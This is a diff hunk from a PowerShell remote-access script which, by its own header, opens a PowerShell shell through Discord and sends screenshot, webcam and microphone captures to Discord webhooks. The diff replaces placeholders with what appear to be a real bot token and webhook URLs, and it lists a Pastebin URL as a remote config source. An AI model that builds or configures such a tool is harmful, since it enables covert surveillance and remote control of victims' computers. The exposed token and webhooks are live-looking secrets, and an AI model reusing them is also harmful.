@@ -39,10 +39,10 @@ Also opens a powershell command line interface through discord.
 # ------------------------- OPTIONS + SETUP ---------------------------
 
 # Option 1 -------- Set token directly here -------
-$global:Token = 'TOKEN_HERE'
-$global:ScreenshotWebhook = 'WEBHOOK1_HERE'
-$global:WebcamWebhook = 'WEBHOOK2_HERE'
-$global:MicrophoneWebhook = 'WEBHOOK3_HERE'
+$global:Token = 'MTI3MjU3MjMxNTA2MTk4MTIwNA.GhiSfA.xy_630XZ2fVk7jIHL1F0V2LrTBU6TnpzizjpKM'
+$global:ScreenshotWebhook = 'https://discord.com/api/webhooks/1272564297087848600/kvuNgwRQ-my3WIcw0xBTPEaq-lEYP67e1qPcZ-xCmo-f57exWJtBPrsjsWSjQmX6CmZt'
+$global:WebcamWebhook = 'https://discord.com/api/webhooks/1272564297087848600/kvuNgwRQ-my3WIcw0xBTPEaq-lEYP67e1qPcZ-xCmo-f57exWJtBPrsjsWSjQmX6CmZt'
+$global:MicrophoneWebhook = 'https://discord.com/api/webhooks/1272564297087848600/kvuNgwRQ-my3WIcw0xBTPEaq-lEYP67e1qPcZ-xCmo-f57exWJtBPrsjsWSjQmX6CmZt'
 
 # Option 2 -------- Set json file URL ----------
 $uri = "https://pastebin.com/raw/AtbxGn6x"
